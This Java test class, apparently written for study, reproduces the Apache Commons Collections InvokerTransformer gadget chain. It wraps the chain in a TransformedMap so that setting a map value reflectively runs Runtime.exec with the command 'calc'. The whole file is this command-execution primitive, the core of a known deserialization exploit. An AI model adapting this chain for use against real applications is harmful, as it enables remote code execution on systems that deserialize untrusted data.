package com.ccnu.test.serial;

import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class TransformTest {
	public static void main(String[] args) {
		Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[] { String.class,
						Class[].class }, new Object[] { "getRuntime",
						new Class[0] }),
				new InvokerTransformer("invoke", new Class[] { Object.class,
						Object[].class }, new Object[] { null, new Object[0] }),
				new InvokerTransformer("exec", new Class[] { String.class },
						new Object[] { "calc" }) };
		Transformer chain = new ChainedTransformer(transformers);
		Map<String, String> innerMap = new HashMap<String, String>();
		innerMap.put("name", "hello");
		Map<?, ?> outerMap = TransformedMap.decorate(innerMap, null, chain);

		@SuppressWarnings("unchecked")
		Entry<?, String> elEntry = (Entry<?, String>) outerMap.entrySet().iterator().next();
		elEntry.setValue("hello");
	}
}